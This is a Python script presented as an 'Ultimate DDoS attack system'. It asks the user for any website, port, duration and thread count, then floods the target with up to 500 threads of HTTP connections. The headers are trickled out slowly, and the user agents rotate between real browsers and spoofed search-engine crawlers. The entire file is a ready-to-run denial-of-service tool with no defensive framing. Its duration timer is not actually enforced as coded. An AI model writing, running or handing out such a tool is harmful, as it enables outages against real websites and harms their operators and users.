import socket
import threading
import ssl
import random
import time
import sys
import re
from concurrent.futures import ThreadPoolExecutor

class UltimateDDoS:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.duration = 300
        self.threads = 200
        self.running = True
        self.requests = 0
        self.lock = threading.Lock()
        self.success_rate = 0
        self.start_time = None
        
    def validate_target(self, url):
        if not url:
            return False
        if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$', url):
            try:
                socket.gethostbyname(url)
                return True
            except:
                return False
        return True
        
    def get_user_input(self):
        print("=" * 50)
        print("  🔥 ULTIMATE DDoS ATTACK SYSTEM 🔥")
        print("=" * 50)
        
        while True:
            self.target = input("🌐 Enter target website (example.com): ").strip().lower()
            if self.validate_target(self.target):
                break
            print("❌ Invalid domain! Try again.")
        
        use_ssl = input("🔐 Use HTTPS? (y/n, default=n): ").strip().lower()
        self.port = 443 if use_ssl in ['y', 'yes'] else 80
        
        try:
            duration = input("⏱️ Attack duration in seconds (default=300): ").strip()
            self.duration = int(duration) if duration else 300
        except:
            self.duration = 300
            
        try:
            threads = input(f"⚡ Number of threads (1-500, default=200): ").strip()
            self.threads = max(1, min(500, int(threads))) if threads else 200
        except:
            self.threads = 200
        
        print("\n" + "=" * 50)
        print(f"🎯 TARGET: {self.target}")
        print(f"🔌 PORT: {self.port}")
        print(f"⏱️ DURATION: {self.duration} seconds")
        print(f"⚡ THREADS: {self.threads}")
        print("=" * 50)
        
        confirm = input("🚀 Start attack? (y/n): ").strip().lower()
        if confirm not in ['y', 'yes']:
            print("❌ Attack cancelled.")
            sys.exit()
            
    def get_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((self.target, self.port))
            
            if self.port == 443:
                s = ssl.create_default_context().wrap_socket(s, server_hostname=self.target)
                
            return s
        except:
            return None

    def flood(self):
        user_agents = [
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]
        
        bots = [
            "bingbot", "crawler", "slurp", "yahoo", "duckduckbot", "baiduspider"
        ]
        
        http_methods = ["GET", "POST", "HEAD"]
        
        while self.running:
            try:
                s = self.get_socket()
                if s:
                    method = random.choice(http_methods)
                    user_agent = random.choice(user_agents)
                    is_bot = random.choice([True, False, False, False])
                    
                    headers = [
                        f"{method} / HTTP/1.1",
                        f"Host: {self.target}",
                        f"User-Agent: {user_agent}",
                        f"X-Requested-With: XMLHttpRequest",
                        f"Connection: keep-alive",
                        f"Accept: */*",
                        f"Accept-Language: en-US,en;q=0.9",
                        f"Accept-Encoding: gzip, deflate, br",
                        f"Cache-Control: no-cache",
                        f"Pragma: no-cache",
                        f"Sec-Fetch-Mode: navigate"
                    ]
                    
                    if is_bot:
                        headers[2] = f"User-Agent: {random.choice(bots)}-{random.randint(1,999)}"
                    
                    for header in headers:
                        try:
                            s.send(f"{header}\r\n".encode())
                            time.sleep(0.002)
                        except:
                            break
                            
                    with self.lock:
                        self.requests += 1
                        if self.requests % 500 == 0:
                            current = time.time()
                            elapsed = current - self.start_time
                            rps = int(self.requests / elapsed) if elapsed > 0 else 0
                            print(f"⚡ {self.requests} requests | {rps} RPS | {int(elapsed)}s")
                            
                time.sleep(0.005)
            except:
                pass

    def start(self):
        self.start_time = time.time()
        print(f"\n🚀 Starting attack on {self.target}:{self.port}")
        print(f"⚡ {self.threads} threads | {self.duration} seconds duration")
        print("🔥 Attack in progress... Press Ctrl+C to stop\n")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                if self.running:
                    executor.submit(self.flood)
                    
        threading.Timer(self.duration, self.stop).start()

    def stop(self):
        self.running = False
        end_time = time.time()
        elapsed = end_time - self.start_time
        rps = int(self.requests / elapsed) if elapsed > 0 else 0
        
        print("\n" + "=" * 50)
        print("💀 ATTACK COMPLETED")
        print("=" * 50)
        print(f"🎯 Target: {self.target}")
        print(f"⏱️ Runtime: {elapsed:.1f} seconds")
        print(f"🔥 Total requests: {self.requests}")
        print(f"⚡ Requests per second: {rps}")
        print("=" * 50)

def main():
    attack = UltimateDDoS()
    attack.get_user_input()
    attack.start()
    
    try:
        while attack.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n⚠️ Stopping attack...")
        attack.stop()

if __name__ == "__main__":
    main()
